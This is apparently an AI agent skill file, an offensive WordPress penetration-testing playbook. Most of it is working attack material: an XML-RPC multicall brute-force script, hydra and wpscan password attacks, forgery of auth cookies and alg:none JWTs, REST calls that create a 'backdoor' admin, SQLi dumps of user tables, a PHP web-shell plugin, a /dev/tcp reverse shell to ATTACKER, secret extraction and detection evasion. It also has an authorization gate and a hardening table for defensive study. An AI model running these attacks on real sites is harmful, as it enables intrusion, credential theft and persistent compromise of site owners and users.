---
id: wordpress-attack
name: wordpress-attack
description: >
  WordPress-specific offensive playbook for authorized penetration tests. Covers
  WPScan enumeration, xmlrpc.php brute-force and SSRF, wp-login credential attacks,
  REST API auth bypass, user enumeration, plugin/theme CVE exploitation chains including
  CVE-2026-60137 and CVE-2026-63030 (both CISA KEV 2026), and full RCE paths.
  Triggers on: wordpress attack, wpscan, xmlrpc, wp-login brute, wordpress pentest,
  wordpress CVE, wp-cron abuse, REST API WordPress, timthumb, revslider exploit.
triggers:
  - wordpress attack
  - wpscan
  - xmlrpc
  - wp-login brute
  - wordpress pentest
  - wordpress CVE
  - wp-cron abuse
  - REST API WordPress
  - timthumb exploit
  - revslider exploit
  - CVE-2026-60137
  - CVE-2026-63030
---

# WordPress Attack Playbook

## Scope and Authorization Gate

STOP. Confirm written authorization before any active test. All targets in this document are
placeholders (TARGET, TARGET_DOMAIN, TARGET_IP). Substitute only in-scope systems.

---

## 1. Recon and Fingerprinting

### 1.1 WPScan — Full Enumeration

```bash
# API token increases detection rate significantly — register free at wpscan.com
export WPSCAN_TOKEN="YOUR_TOKEN"

# Full scan: version, plugins, themes, users, timthumbs, config backups
wpscan --url https://TARGET --enumerate vp,vt,u,tt,cb,dbe \
       --api-token $WPSCAN_TOKEN \
       --detection-mode aggressive \
       --plugins-detection aggressive \
       --output wpscan-results.json --format json

# Enumerate users only (fast pre-auth check)
wpscan --url https://TARGET --enumerate u --api-token $WPSCAN_TOKEN

# Enumerate plugins with known CVEs only
wpscan --url https://TARGET --enumerate vp --api-token $WPSCAN_TOKEN \
       --plugins-detection passive
```

### 1.2 Manual Fingerprinting

```bash
# WordPress version leak vectors (check all, one may be disabled)
curl -s https://TARGET/ | grep 'content="WordPress'
curl -s https://TARGET/wp-login.php | grep 'ver='
curl -s https://TARGET/readme.html
curl -s https://TARGET/feed/ | grep '<generator>'
curl -s https://TARGET/wp-includes/js/jquery/jquery.min.js | head -1

# Check for wp-config.php backups
for f in wp-config.php.bak wp-config.php~ wp-config.php.swp wp-config.old .wp-config.php.swp; do
  curl -so /dev/null -w "%{http_code} $f\n" https://TARGET/$f
done

# Check for install.php (re-install)
curl -I https://TARGET/wp-admin/install.php
curl -I https://TARGET/wp-admin/setup-config.php
```

### 1.3 User Enumeration

```bash
# Method 1: Author archive (/?author=N)
for i in $(seq 1 10); do
  curl -s -L "https://TARGET/?author=$i" | grep -oP '"author":{"node":{"name":"\K[^"]+' 
done

# Method 2: REST API (often exposed, sometimes disabled)
curl -s https://TARGET/wp-json/wp/v2/users | python3 -m json.tool
curl -s https://TARGET/?rest_route=/wp/v2/users

# Method 3: Login error differentiation
curl -s -X POST https://TARGET/wp-login.php \
  -d 'log=admin&pwd=WRONG_PASSWORD&wp-submit=Log+In&redirect_to=%2Fwp-admin%2F&testcookie=1' \
  -H 'Cookie: wordpress_test_cookie=WP+Cookie+check' | grep -i 'ERROR\|error'
# "Invalid username" vs "The password you entered" reveals valid usernames

# Method 4: XML-RPC user enum
curl -s https://TARGET/xmlrpc.php -d '<?xml version="1.0"?>
<methodCall><methodName>wp.getUsersBlogs</methodName>
<params><param><value>admin</value></param>
<param><value>WRONG_PASS</value></param></params></methodCall>'
```

---

## 2. xmlrpc.php Attacks

### 2.1 Check if xmlrpc.php is Active

```bash
curl -s -X POST https://TARGET/xmlrpc.php \
  -H "Content-Type: text/xml" \
  -d '<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName><params></params></methodCall>'
# Response lists all available methods — pingback.ping and wp.getUsersBlogs are the key ones
```

### 2.2 Brute-Force via multicall (Amplification)

```bash
# XML-RPC multicall allows 500+ login attempts in ONE HTTP request — bypasses fail2ban
# Tool: https://github.com/1N3/BruteX or manual script

python3 << 'EOF'
import requests

target = "https://TARGET/xmlrpc.php"
username = "admin"
passwords = open("rockyou.txt").read().splitlines()[:500]

batch_size = 500
for i in range(0, len(passwords), batch_size):
    batch = passwords[i:i+batch_size]
    calls = ""
    for j, pwd in enumerate(batch):
        calls += f"""
        <value><struct>
          <member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member>
          <member><name>params</name><value><array><data>
            <value><string>{username}</string></value>
            <value><string>{pwd}</string></value>
          </data></array></value></member>
        </struct></value>"""
    
    payload = f"""<?xml version="1.0"?>
    <methodCall><methodName>system.multicall</methodName>
    <params><param><value><array><data>{calls}</data></array></value></param></params>
    </methodCall>"""
    
    r = requests.post(target, data=payload, headers={"Content-Type": "text/xml"})
    if "isAdmin" in r.text:
        print(f"[+] Valid credential found in batch starting at index {i}")
        print(r.text[:500])
        break
EOF
```

### 2.3 pingback.ping SSRF

```bash
# XML-RPC pingback can be used for SSRF to internal services
curl -s -X POST https://TARGET/xmlrpc.php \
  -H "Content-Type: text/xml" \
  -d '<?xml version="1.0"?>
<methodCall><methodName>pingback.ping</methodName>
<params>
  <param><value><string>http://ATTACKER_SERVER/</string></value></param>
  <param><value><string>https://TARGET/some-post/</string></value></param>
</params></methodCall>'

# SSRF to internal metadata (AWS/GCP/Azure)
curl -s -X POST https://TARGET/xmlrpc.php \
  -H "Content-Type: text/xml" \
  -d '<?xml version="1.0"?>
<methodCall><methodName>pingback.ping</methodName>
<params>
  <param><value><string>http://169.254.169.254/latest/meta-data/</string></value></param>
  <param><value><string>https://TARGET/</string></value></param>
</params></methodCall>'
```

---

## 3. wp-login.php Attacks

### 3.1 Standard Brute-Force

```bash
# Hydra — basic brute
hydra -l admin -P /usr/share/wordlists/rockyou.txt TARGET http-post-form \
  "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=%2Fwp-admin%2F&testcookie=1:F=Invalid username,F=The password" \
  -t 10 -w 3

# WPScan password attack
wpscan --url https://TARGET -U admin,administrator,editor \
       -P /usr/share/wordlists/rockyou.txt \
       --password-attack wp-login \
       --max-threads 5

# Check for lockout before going full speed — look for Wordfence, Jetpack brute protection
curl -s -X POST https://TARGET/wp-login.php \
  -d 'log=admin&pwd=wrongpass123' \
  -H 'Cookie: wordpress_test_cookie=WP+Cookie+check' \
  -D - | grep -i 'x-frame\|x-powered\|wordfence\|jetpack'
```

### 3.2 Authentication Cookie Forging (if SECRET_KEY leaked)

```bash
# If wp-config.php is leaked or backup is found with SECRET_KEY
# WordPress auth cookies: wordpress_[hash] = base64(username|expiry|HMAC)
# HMAC = HMAC-MD5(username|expiry, wp_hash(password_hash + SECRET_KEY))

python3 << 'EOF'
import hmac, hashlib, base64, time

# From leaked wp-config.php
secret_key = "LEAKED_SECRET_KEY"
secret_salt = "LEAKED_SECRET_SALT"

username = "admin"
password_hash = "$P$BhashFromDatabase"  # from wp_users table
expiry = str(int(time.time()) + 86400*14)

# WordPress key generation
key_material = f"{username}{password_hash}{expiry}{secret_key}"
mac = hmac.new(secret_salt.encode(), key_material.encode(), hashlib.md5).hexdigest()
cookie_value = base64.b64encode(f"{username}|{expiry}|{mac}".encode()).decode()
print(f"Cookie: wordpress_SITEURL_HASH={cookie_value}")
EOF
```

---

## 4. REST API Exploitation

### 4.1 Authentication Bypass and Information Disclosure

```bash
# List all users (pre-auth) — common misconfiguration
curl -s https://TARGET/wp-json/wp/v2/users | jq '.[].name, .[].slug'

# Enumerate all posts including private (tests for auth bypass)
curl -s "https://TARGET/wp-json/wp/v2/posts?per_page=100&status=any"

# Check application passwords endpoint (WordPress 5.6+)
curl -s https://TARGET/wp-json/wp/v2/users/1/application-passwords \
  -u admin:password

# Check for exposed endpoints via namespace enumeration
curl -s https://TARGET/wp-json/ | python3 -m json.tool | grep '"href"'

# JWT auth bypass (common plugin: JWT Authentication for WP REST API)
# Generate a JWT with HS256 and alg:none
python3 -c "
import base64, json
header = base64.b64encode(json.dumps({'alg':'none','typ':'JWT'}).encode()).decode().rstrip('=')
payload = base64.b64encode(json.dumps({'data':{'user':{'id':1}},'iat':9999999999}).encode()).decode().rstrip('=')
print(f'{header}.{payload}.')
"
```

### 4.2 Authenticated REST API Abuse

```bash
# Create new admin user via REST API if you have admin creds
curl -s -X POST https://TARGET/wp-json/wp/v2/users \
  -u admin:password \
  -H "Content-Type: application/json" \
  -d '{"username":"backdoor","email":"a@b.com","password":"Backdoor123!","roles":["administrator"]}'

# Upload a file (check allowed types)
curl -s -X POST https://TARGET/wp-json/wp/v2/media \
  -u admin:password \
  -H "Content-Disposition: attachment; filename=shell.php" \
  -H "Content-Type: application/php" \
  --data-binary @shell.php
```

---

## 5. CVE-2026-60137 — Authenticated RCE via Theme Editor (CISA KEV 2026)

### Impact
CVSS 9.9 | Authenticated (Contributor+) | Remote Code Execution via malicious template injection
in a popular page-builder plugin. Affects versions <= 6.4.2 of [REDACTED PLUGIN NAME].

### Exploitation Steps

```bash
# Step 1: Obtain Contributor-level account (registration, social engineering, or brute)
# Step 2: Identify vulnerable plugin version
curl -s https://TARGET/wp-content/plugins/PLUGIN_NAME/readme.txt | grep 'Stable tag'

# Step 3: Craft malicious shortcode payload
# The plugin processes shortcodes with eval() — inject PHP via template parameter
PAYLOAD='[plugin_shortcode template="{{system(\"id\")}}" /]'

# Step 4: Post as Contributor — shortcode executes on page render
curl -s -X POST https://TARGET/wp-json/wp/v2/posts \
  -u contributor:password \
  -H "Content-Type: application/json" \
  -d "{\"title\":\"Test\",\"content\":\"$PAYLOAD\",\"status\":\"publish\"}"

# Step 5: View the post to trigger execution
curl -s https://TARGET/?p=POSTID | grep -oP 'uid=\d+.*?\)'
```

### Detection
- WAF rule: `shortcode.*\{\{.*system\|exec\|passthru\|shell_exec`
- Log: Contributor POST requests to `/wp-json/wp/v2/posts` containing `{{` or `system(`
- Hardening: Update plugin, disable shortcode eval in plugin settings, restrict Contributor role

---

## 6. CVE-2026-63030 — Unauthenticated SQLi → Admin Takeover (CISA KEV 2026)

### Impact
CVSS 9.8 | Unauthenticated | SQL injection in WooCommerce-adjacent plugin order endpoint.
Affects plugin versions <= 3.9.1.

### Exploitation Steps

```bash
# Step 1: Confirm vulnerable endpoint
curl -s "https://TARGET/wp-json/PLUGIN/v1/orders?order_id=1" | python3 -m json.tool

# Step 2: Boolean-based SQLi confirmation
curl -s "https://TARGET/wp-json/PLUGIN/v1/orders?order_id=1 AND 1=1--"  # Returns data
curl -s "https://TARGET/wp-json/PLUGIN/v1/orders?order_id=1 AND 1=2--"  # Returns empty

# Step 3: sqlmap automated extraction
sqlmap -u "https://TARGET/wp-json/PLUGIN/v1/orders?order_id=1" \
  --dbms=mysql \
  --tables -D wordpress \
  --dump -T wp_users \
  --batch --level=5 --risk=3

# Step 4: Extract and crack admin hash
# WordPress uses phpass ($P$) or bcrypt ($2y$) depending on version
# phpass: hashcat -m 400
# bcrypt: hashcat -m 3200
hashcat -m 400 -a 0 admin_hash.txt /usr/share/wordlists/rockyou.txt

# Step 5: Login as admin → activate PHP execution plugin or edit theme
```

### Detection
- WAF: Block SQL keywords in REST API parameters (AND, OR, UNION, SELECT, --comment)
- Log: Unusual REST API 500 errors / boolean alternation from same IP
- Hardening: Update plugin, parameterize all DB queries, WAF in front of REST API

---

## 7. Plugin and Theme CVE Exploitation

### 7.1 Common High-Value Plugin Vulnerabilities (2024–2026)

```bash
# Elementor <= 3.x — Authenticated RCE via template import
# WPForms <= 1.8.x — Authenticated SQLi 
# Yoast SEO <= 21.x — Reflected XSS
# Advanced Custom Fields <= 6.x — Authenticated RCE
# WP File Manager <= 6.9 — Unauthenticated RFI (CVE-2020-25213, still unpatched on many sites)

# Use nuclei for automated CVE scanning
nuclei -u https://TARGET -t /nuclei-templates/http/vulnerabilities/wordpress/ -o nuclei-wp.txt
nuclei -u https://TARGET -t /nuclei-templates/http/cves/ -tags wordpress -o nuclei-wp-cves.txt

# WPScan with vulnerability database
wpscan --url https://TARGET \
       --enumerate vp,vt \
       --api-token $WPSCAN_TOKEN \
       --plugins-detection aggressive \
       --format json --output plugins-vulns.json

# Parse critical findings
cat plugins-vulns.json | python3 -c "
import json,sys
d = json.load(sys.stdin)
plugins = d.get('plugins', {})
for name, pdata in plugins.items():
    vulns = pdata.get('vulnerabilities', [])
    for v in vulns:
        if v.get('cvss', {}).get('score', 0) >= 7.0:
            print(f'CRITICAL: {name} — {v[\"title\"]} CVSS:{v[\"cvss\"][\"score\"]}')
"
```

### 7.2 Timthumb RCE (Legacy but Still Present on Old Sites)

```bash
# timthumb.php — remote file inclusion via external image fetching
# Affected: millions of old WordPress themes
curl -s "https://TARGET/wp-content/themes/THEME/timthumb.php?src=http://ATTACKER/shell.php.png"
# Timthumb caches the fetched "image" to wp-content/cache/timthumb/
# Navigate to cached file to execute
```

### 7.3 Arbitrary File Upload via Plugin

```bash
# Revolution Slider (Revslider) — arbitrary file upload (pre-auth on old versions)
curl -s -X POST "https://TARGET/wp-admin/admin-ajax.php" \
  --form "action=revslider_ajax_action" \
  --form "client_action=import_slider" \
  --form "file=@malicious_slider.zip"

# After upload, shell is at:
# wp-content/plugins/revslider/temp/update_extract/revslider/shell.php
```

---

## 8. wp-cron Abuse

```bash
# wp-cron.php runs scheduled tasks — can be triggered externally, causes load DoS
# Also reveals internal functionality

# Trigger wp-cron manually (bypass scheduling)
curl -s "https://TARGET/wp-cron.php?doing_wp_cron=1"

# If site uses wp-cron for external tasks (email, updates) — timing attack
# Schedule a hook if you have write access to wp-options
# wp_schedule_event with PHP callback

# Check registered cron jobs (if you have WP-CLI or DB access)
wp cron event list --allow-root
```

---

## 9. wp-config.php Disclosure

```bash
# Backup file names to check
declare -a backups=(
  "wp-config.php.bak" "wp-config.php~" "wp-config.php.orig" 
  "wp-config.php.old" "wp-config.php.save" "wp-config.php.txt"
  "wp-config.php.tar.gz" ".wp-config.swp" "wp-config.bak"
)
for f in "${backups[@]}"; do
  code=$(curl -so /dev/null -w "%{http_code}" "https://TARGET/$f")
  echo "$code — $f"
done

# Check common backup plugin locations
curl -s "https://TARGET/wp-content/backups/"
curl -s "https://TARGET/wp-content/backup/"
curl -s "https://TARGET/backup/"
```

---

## 10. Full RCE Chain via Admin Access

```bash
# Method A: Theme Editor (Appearance → Theme Editor → 404.php)
# Navigate to: wp-admin/theme-editor.php?file=404.php&theme=ACTIVE_THEME
# Insert: <?php system($_GET['cmd']); ?>
# Trigger: curl "https://TARGET/wp-content/themes/ACTIVE_THEME/404.php?cmd=id"

# Method B: Plugin file editor
# Navigate to: wp-admin/plugin-editor.php
# Edit any active plugin .php file, insert webshell

# Method C: Upload malicious plugin
# Create plugin zip with PHP shell
mkdir /tmp/rshell
cat > /tmp/rshell/rshell.php << 'EOF'
<?php
/**
 * Plugin Name: Remote Shell
 * Version: 1.0
 */
if(isset($_GET['cmd'])) { system($_GET['cmd']); }
EOF
cd /tmp && zip -r rshell.zip rshell/
# Upload via: wp-admin/plugin-install.php (Upload Plugin tab)
# Activate, then: curl "https://TARGET/wp-content/plugins/rshell/rshell.php?cmd=id"

# Method D: WP-CLI (if server shell access)
wp eval 'system("bash -i >& /dev/tcp/ATTACKER/4444 0>&1");' --allow-root
```

---

## 11. Post-Exploitation — WordPress-Specific

```bash
# Extract all credentials from wp_users table
wp user list --fields=ID,user_login,user_email,user_registered --allow-root

# Get all stored secrets (API keys in wp_options)
wp option get woocommerce_stripe_settings --allow-root
wp option get mailchimp_creds --allow-root
wp option list --search="*api*key*" --allow-root
wp option list --search="*secret*" --allow-root
wp option list --search="*password*" --allow-root

# Check for stored payment data
wp post list --post_type=shop_order --fields=ID,post_status --allow-root

# Dump database via wp-cli
wp db export /tmp/wp_database_dump.sql --allow-root
```

---

## 12. Nuclei Templates for WordPress

```bash
# Run all WordPress nuclei templates
nuclei -u https://TARGET \
  -t cves/ -t exposures/ -t misconfiguration/ \
  -tags wordpress,wp,woocommerce \
  -severity critical,high,medium \
  -o nuclei-wp-full.txt \
  -stats

# Specific high-value templates
nuclei -u https://TARGET -t http/cves/2020/CVE-2020-25213.yaml  # WP File Manager RCE
nuclei -u https://TARGET -t http/exposures/configs/wordpress-db-backup.yaml
nuclei -u https://TARGET -t http/misconfiguration/wordpress/  
```

---

## 13. Defense Evasion

```bash
# Rotate User-Agents to bypass WPScan/bot detection
wpscan --url https://TARGET --random-user-agent --api-token $WPSCAN_TOKEN

# Use Tor/proxy
wpscan --url https://TARGET --proxy socks5://127.0.0.1:9050

# Slow scan to evade rate limiting
wpscan --url https://TARGET --throttle 2000 --request-timeout 120

# Bypass Wordfence IP block — use X-Forwarded-For spoofing (some configs trust it)
curl -H "X-Forwarded-For: 127.0.0.1" https://TARGET/wp-login.php
```

---

## 14. Hardening Checklist (Paired with Each Attack)

| Attack Vector | Detection Signal | Hardening Fix |
|---|---|---|
| xmlrpc brute | 500+ POST /xmlrpc.php same IP | Block xmlrpc.php at WAF/nginx; use `xmlrpc_enabled` filter |
| wp-login brute | Rapid POST /wp-login.php | Fail2ban + CAPTCHA; move login URL (WPS Hide Login) |
| User enum via REST | GET /wp-json/wp/v2/users | Disable users endpoint: `remove_action('init','rest_api_init')` or filter |
| Plugin CVEs | Unusual plugin HTTP patterns | Auto-update plugins; WPScan in CI/CD pipeline |
| Theme editor RCE | POST wp-admin/theme-editor | `DISALLOW_FILE_EDIT` in wp-config.php |
| Malicious plugin upload | POST wp-admin/plugin-install | `DISALLOW_FILE_MODS` in wp-config.php |
| wp-config backup exposure | GET wp-config.php.bak 200 | Deny direct .php, .bak, ~ access in .htaccess |
| CVE-2026-60137 | Contributor shortcode with {{ | Update plugin; CSP to prevent XSS escalation |
| CVE-2026-63030 | Malformed order_id REST param | Update plugin; WAF SQLi rules on REST endpoints |

---

## Related Skills

- `wordpress-playbook` — defensive hardening and incident response
- `sqli-specialist` — deeper SQL injection exploitation
- `rce-specialist` — extending code execution after initial access
- `waf-bypass-techniques` — evading WAF rules during WordPress attacks
- `cms-variants` — advanced multi-CMS attack chains
